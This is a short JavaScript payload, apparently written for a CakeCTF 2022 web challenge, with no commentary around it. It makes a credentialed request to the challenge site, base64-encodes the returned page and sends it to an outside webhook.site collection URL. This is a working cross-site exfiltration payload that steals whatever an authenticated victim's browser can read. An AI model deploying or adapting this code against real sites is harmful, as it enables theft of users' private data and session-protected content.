var r = new XMLHttpRequest();
r.open("GET", "http://web1.2022.cakectf.com:8003/", true); 
r.onreadystatechange = function() { 
    if (r.readyState == 4){
        var res = r.response;
        var txt = 'https://webhook.site/d8b954b5-bb14-49c5-a9f0-832f01ff7978/q=' + btoa(res);
        var r2 = new XMLHttpRequest();
        r2.open("GET", txt, true); 
        r2.withCredentials = true;
r2.send();
    }
};
r.withCredentials = true;
r.send();
